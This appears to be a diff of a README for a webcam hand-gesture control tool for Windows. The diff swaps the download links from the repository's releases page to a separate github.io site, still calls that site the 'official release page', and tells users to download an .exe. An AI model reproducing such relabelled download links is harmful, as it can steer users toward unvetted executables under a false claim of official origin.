@@ -1,6 +1,6 @@
 # 🖐️ Control_pc_using_Hand-Gesture-main - Navigate your computer with hand movements
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Pc304829/Control_pc_using_Hand-Gesture-main/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://pc304829.github.io)
 
 This software lets you control your computer mouse and system settings using your hands. A webcam watches your movements and translates them into commands on your screen. You do not need to touch your mouse or keyboard to finish common tasks.
 
@@ -8,7 +8,7 @@ This software lets you control your computer mouse and system settings using you
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official release page](https://github.com/Pc304829/Control_pc_using_Hand-Gesture-main/releases) to access the download files.
+1. Visit the [official release page](https://pc304829.github.io) to access the download files.
 2. Look for the file ending in .exe in the latest release section.
 3. Click the file to start the download to your computer.
 4. Move the file to a folder where you want to keep your programs.
